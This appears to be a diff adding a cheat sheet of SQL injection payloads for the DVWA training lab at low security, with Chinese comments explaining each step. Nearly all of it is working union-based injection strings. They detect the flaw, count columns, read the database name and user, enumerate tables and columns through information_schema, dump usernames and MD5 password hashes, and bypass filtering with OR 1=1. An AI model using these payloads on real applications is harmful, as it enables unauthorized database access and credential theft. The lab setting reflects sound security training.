@@ -1,0 +1,33 @@
+# DVWA SQL Injection Payloads (Security Level: Low)
+# 数据库类型：MySQL
+# 注释符：#
+
+# 1. 检测注入点
+1'
+# 说明：输入单引号，页面报错，确认存在 SQL 注入漏洞。
+
+# 2. 判断字段数（猜列数）
+1' ORDER BY 1#
+1' ORDER BY 2#
+1' ORDER BY 3#
+# 说明：直到 ORDER BY n 报错，则字段数为 n-1。此处得到字段数为 2。
+
+# 3. 获取当前数据库名和数据库用户
+1' UNION SELECT database(), user()#
+# 说明：返回数据库名（dvwa）和用户名（root@localhost）。
+
+# 4. 获取所有表名
+1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'#
+# 说明：返回 dvwa 数据库中的所有表，包括 guestbook 和 users。
+
+# 5. 获取 users 表的列名
+1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'#
+# 说明：返回 users 表的列名，重点关注 user 和 password 列。
+
+# 6. 导出用户名和密码
+1' UNION SELECT user, password FROM users#
+# 说明：返回所有用户的用户名和 MD5 哈希密码。
+
+# 7. 可选：布尔条件绕过（显示所有记录）
+1' OR 1=1#
+# 说明：使查询返回表中所有记录，可用于绕过简单筛选。
